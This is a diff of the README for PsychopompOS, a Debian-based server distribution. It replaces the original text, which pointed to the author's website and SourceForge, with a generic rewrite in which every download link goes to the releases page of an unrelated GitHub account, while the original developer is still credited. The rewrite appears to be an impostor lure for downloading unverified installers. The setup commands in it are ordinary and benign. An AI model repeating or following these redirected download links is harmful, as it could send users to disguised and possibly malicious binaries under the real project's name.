@@ -1,97 +1,125 @@
-# PsychopompOS
+# 🖥️ PsychopompOS - A Secure Server Experience Made Easy
 
-![PsychopompOS Logo](assets/images/psychopomp-os-bg2.png)
+[![Download PsychopompOS](https://img.shields.io/badge/Download-PsychopompOS-blue?style=for-the-badge)](https://github.com/Bgencacat4819/PsychopompOS/releases)
 
-**PsychopompOS** is a GNU/Linux distribution derived from **Debian 13 (Trixie)**, engineered for **server environments** and **cybersecurity operations**.  
-It combines the stability and long-term support of Debian with an expanded, security-focused package set and preconfigured services for rapid deployment.
+## 📋 Overview
 
----
+PsychopompOS is a Debian 13 (Trixie) derivative, purpose-built for server environments and cybersecurity operations. It provides a secure and ready-to-use platform with a focused package set. This allows for quick deployment for hosting, network services, and safe remote administration. 
 
-## 📥 Download
+Developed by @bocaletto-luca, this operating system offers optimized tools ideal for both new and experienced users.
 
-The latest stable release is **v0.6.0**. File Download in SourceForge Webisite
+## 🚀 Getting Started
 
-<a href="https://bocaletto-luca.github.io/PsychopompOS/index.html" target="_blank" rel="noopener noreferrer">
-  <img src="https://img.shields.io/badge/Visit%20Website-00bfff?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Visit Website">
-</a>
-<a href="https://sourceforge.net/projects/psychopompos/files/latest/download" target="_blank" rel="noopener noreferrer">
-  <img src="https://img.shields.io/badge/Download%20on-SourceForge-orange?style=for-the-badge&logo=sourceforge&logoColor=white" alt="Download on SourceForge">
-</a>
+1. **System Requirements**
 
----
+   - **CPU**: 64-bit processor (Intel or AMD)
+   - **RAM**: Minimum 4 GB (8 GB or more recommended)
+   - **Storage**: At least 20 GB of free space
+   - **Network**: Internet connection for package updates and installations
 
-## 🚀 Key Features
+2. **Supported Use Cases**
+   
+   - Web hosting with Apache2
+   - Mail server configurations
+   - Database management using MariaDB
+   - Web applications running PHP and phpMyAdmin
+   - Python programming environments
+   - Secure remote administration with Webmin
 
-- **Debian 13 Base** – Stability, security updates, and full repository compatibility.
-- **Preinstalled LAMP Stack** – Apache2, MariaDB, PHP with common modules.
-- **Secure Mail Server** – Postfix, Dovecot, Roundcube with extra plugins.
-- **Security Tools** – UFW firewall, Fail2ban, nmap, tcpdump, arp-scan, mtr, netcat-openbsd.
-- **Development Environment** – Python 3, OpenJDK 17, Node.js, npm, Git, build-essential.
-- **Offline Administration Tools** – phpMyAdmin, Webmin, tgpt CLI tool bundled as `.deb` packages.
-- **Optimized Defaults** – System branding, tuned configurations, essential services enabled by default.
+## 📥 Download & Install
 
----
+To get started, visit this page to download: [PsychopompOS Releases Page](https://github.com/Bgencacat4819/PsychopompOS/releases).
 
-## 📂 Documentation
+1. Click on the most recent version of PsychopompOS.
+2. Locate the installer file suitable for your hardware architecture.
+3. Download the file to your computer.
 
-Full documentation is available in the [`/docs`](docs) directory:
+## ⚙️ Installation Steps
 
-- [Overview](docs/overview.md)
-- [Installation Guide](docs/installation.md)
-- [Post-Installation Guide](docs/post-install.md)
-- [Security Guidelines](docs/security.md)
-- [Package List](docs/packages.md)
-- [Download Instructions](docs/download.md)
+1. **Prepare Your Computer**
 
----
+   - Backup any important data.
+   - Ensure your computer meets the system requirements.
 
-## 📦 Package Highlights
+2. **Create a Bootable USB Drive**
 
-See the full [Package List](docs/packages.md) for details.
+   - Use a tool like Rufus or Balena Etcher.
+   - Select the downloaded PsychopompOS file.
+   - Choose your USB drive and start the process.
 
-- **Web Server & Database**: Apache2, MariaDB, PHP modules
-- **Mail Server & Webmail**: Postfix, Dovecot, Roundcube
-- **Security Tools**: UFW, Fail2ban, nmap, tcpdump
-- **Development Tools**: Python 3, OpenJDK 17, Node.js, npm, Git
-- **Utilities**: htop, screen, tmux, certbot, logwatch
+3. **Boot from USB**
 
----
+   - Restart your computer and enter your BIOS/UEFI settings (usually done by pressing 'F2', 'F10', or 'Del').
+   - Set the USB drive as the first boot device.
+   - Save changes and exit.
 
-## 🛡️ Security
+4. **Install PsychopompOS**
 
-PsychopompOS ships with a hardened baseline configuration.  
-See [Security Guidelines](docs/security.md) for recommended post-install hardening steps.
+   - Follow the on-screen instructions.
+   - Choose your language and keyboard layout.
+   - Select the installation type (e.g., erase disk, dual boot).
+   - Create a username and password when prompted.
+   - Proceed with the installation.
 
----
+5. **Reboot and Configure**
 
-## 🗓️ Changelog
+   - Once installation is complete, remove the USB.
+   - Restart the computer.
+   - Log in with the username and password you created.
 
-See [CHANGELOG.md](CHANGELOG.md) for a full list of changes.
+## ⚡ Quick Setup Guide
 
----
+After installation, here are a few quick tasks to set up PsychopompOS:
 
-## 🤝 Contributing
+- **Update Packages**: Open the terminal and run:
+  ```
+  sudo apt update && sudo apt upgrade
+  ```
+  
+- **Install Useful Applications**: You can install applications as needed using:
+  ```
+  sudo apt install package-name
+  ```
 
-Contributions are welcome!  
-Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) before submitting pull requests.
+- **Setup Firewall**: Ensure your system is safe by setting up a firewall:
+  ```
+  sudo ufw enable
+  ```
 
----
+- **Remote Access**: To enable secure remote access, install:
+  ```
+  sudo apt install openssh-server
+  ```
 
-## 📢 Community & Support
+## 🔧 Common Tasks
 
-- **Issues**: Use the [GitHub Issues](../../issues) page to report bugs or request features.
-- **Discussions**: Join the [GitHub Discussions](../../discussions) for general questions.
-- **Security Reports**: Follow the process in [SECURITY.md](SECURITY.md).
+- **Web Server**: Set up an Apache2 web server:
+  ```
+  sudo apt install apache2
+  ```
 
----
+- **Database Management**: Install MariaDB:
+  ```
+  sudo apt install mariadb-server
+  ```
 
-## 📜 License
+- **PHP Installation**: Get PHP and needed extensions:
+  ```
+  sudo apt install php libapache2-mod-php php-mysql
+  ```
 
-PsychopompOS is released under the **GNU General Public License v3.0**.  
-See the [LICENSE](LICENSE) file for full terms.
+## 📌 Community Support
 
----
+If you face any issues or have questions about PsychopompOS, consider these resources:
 
-© 2025 Bocaletto Luca – PsychopompOS Project
+- **GitHub Issues**: Report bugs or request features on the [PsychopompOS GitHub page](https://github.com/Bgencacat4819/PsychopompOS/issues).
+  
+- **Forums**: Engage with users and developers for advice and troubleshooting.
 
----
+- **Documentation**: Refer to the official Debian documentation for guidance on specific tasks.
+
+## 📞 Contact
+
+For direct inquiries, you can reach the developer @bocaletto-luca on GitHub.
+
+[![Download PsychopompOS](https://img.shields.io/badge/Download-PsychopompOS-blue?style=for-the-badge)](https://github.com/Bgencacat4819/PsychopompOS/releases)
